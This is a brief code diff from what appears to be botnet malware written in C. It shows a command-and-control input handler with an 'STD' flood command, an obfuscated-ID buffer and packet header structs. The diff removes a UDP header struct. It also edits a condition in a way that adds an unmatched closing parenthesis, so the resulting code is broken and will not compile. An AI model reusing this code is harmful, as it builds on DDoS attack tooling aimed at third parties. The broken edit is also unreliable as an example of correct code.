@@ -72,12 +72,7 @@ struct grehdr {
     uint16_t flags;
     uint16_t protocol;
 };
-struct udphdr {
-    uint16_t source;
-    uint16_t dest;
-    uint16_t len;
-    uint16_t check;
-};
+
 
 char obf_uid[64];
 
@@ -954,7 +949,7 @@ void cncinput(int argc, unsigned char *argv[]) {
 }
 	if(!strcmp(argv[1], "STD"))
         {
-            if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
+            if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1))
             {
  
                         return;
